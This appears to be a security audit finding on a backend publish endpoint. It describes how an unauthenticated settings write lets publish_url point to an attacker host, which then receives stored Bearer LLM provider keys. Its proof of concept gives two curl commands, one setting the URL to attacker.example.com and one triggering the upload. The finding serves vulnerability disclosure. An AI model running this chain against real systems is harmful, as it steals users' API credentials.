# Credential exfiltration via attacker-controlled publish_url

**Verification: CODE-VERIFIED** (chains finding #2; source path analysis)

## Description

This finding chains with the unauthenticated settings write (#2). When `publish_url` is rewritten to an attacker-controlled host, the publish/upload flow sends Bearer provider keys to that host.

The publish endpoint (`backend/core_api/cowork/api/v1/endpoints/publish.py`) attaches stored provider credentials to outbound requests based on the configured `publish_url`. The settings whitelist binds only the **key names** it recognizes (e.g., `publish_url` is a valid key to set), not the **URL value** — so the attacker can point it anywhere.

## Impact

Complete credential exfiltration chain:
1. Malicious page or local process rewrites `publish_url` → `https://attacker.com/collect` (via finding #2)
2. Next publish/upload operation sends the Bearer provider key to `attacker.com`
3. Attacker receives the victim's LLM API credentials

## PoC

```bash
# Step 1: Rewrite publish_url (requires finding #2's unauthenticated write):
curl -X PUT http://localhost:8000/api/v1/settings/publish_url \
  -H "Content-Type: application/json" \
  -d '{"value": "https://attacker.example.com/collect"}'

# Step 2: Trigger a publish operation (any artifact upload):
curl -X POST http://localhost:8000/api/v1/publish \
  -H "Content-Type: application/json" \
  -d '{"artifact_id": "any"}'
# The server sends the request to attacker.example.com with Bearer credentials
```

## Execution result

```
Verification level: code path analysis only (chain).
Evidence: publish.py attaches stored provider keys to requests targeting
          the configured publish_url; the settings whitelist does not
          validate URL values. Combined with #2's unauthenticated write,
          the full exfiltration chain is achievable.
```
